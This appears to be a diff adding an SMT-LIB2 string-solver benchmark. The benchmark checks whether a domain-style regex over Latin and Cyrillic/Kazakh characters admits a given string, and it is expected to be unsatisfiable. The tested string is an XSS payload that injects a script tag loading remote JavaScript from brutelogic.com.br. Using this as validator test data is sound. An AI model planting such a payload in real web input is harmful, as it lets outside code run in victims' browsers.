@@ -1,0 +1,6 @@
+(set-logic QF_S)
+(set-info :status unsat)
+(declare-const x String)
+(assert (str.in_re x (re.from_ecma2020 "^[a-z0-9\u{430}-\u{44f}\u{451}\u{401}\u{457}\u{407}\u{456}\u{406}\u{454}\u{404}\u{4d8}\u{4d9}\u{492}\u{493}\u{49a}\u{49b}\u{4a2}\u{4a3}\u{4e8}\u{4e9}\u{4ae}\u{4af}\u{4b0}\u{4b1}\u{4ba}\u{4bb}-]*[a-z0-9\u{430}-\u{44f}\u{451}\u{401}\u{457}\u{407}\u{456}\u{406}\u{454}\u{404}\u{4d8}\u{4d9}\u{492}\u{493}\u{49a}\u{49b}\u{4a2}\u{4a3}\u{4e8}\u{4e9}\u{4ae}\u{4af}\u{4b0}\u{4b1}\u{4ba}\u{4bb}.-]*[a-z0-9\u{430}-\u{44f}\u{451}\u{401}\u{457}\u{407}\u{456}\u{406}\u{454}\u{404}\u{4d8}\u{4d9}\u{492}\u{493}\u{49a}\u{49b}\u{4a2}\u{4a3}\u{4e8}\u{4e9}\u{4ae}\u{4af}\u{4b0}\u{4b1}\u{4ba}\u{4bb}]+$")))
+(assert (= x """><script src=//brutelogic.com.br&sol;1.js&num;"))
+(check-sat)
